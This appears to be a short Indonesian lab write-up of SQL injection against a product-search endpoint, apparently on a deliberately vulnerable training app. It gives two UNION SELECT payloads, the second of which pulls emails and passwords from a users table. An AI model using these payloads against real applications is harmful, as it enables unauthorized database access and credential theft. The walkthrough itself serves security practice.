1. Untuk mendapatkan user credentials, gunakan endpoint /rest/products/search
   dengan payload
   ```
    ))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9%20FROM%20users--
   ```
   <img width="1543" height="448" alt="image" src="https://github.com/user-attachments/assets/ef9a55d6-a701-4155-b3d0-2a1b20310f20" /> <br />
   dapat dilihat sql command berhasil diinjeksi

2. Dengan menggunakan payload untuk membersihkan datanya
    ```
    M')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
    ```
   Kredensial berhasil didapat
   <img width="1766" height="950" alt="image" src="https://github.com/user-attachments/assets/e7773756-64bf-49a5-8e38-ae7d51065036" />


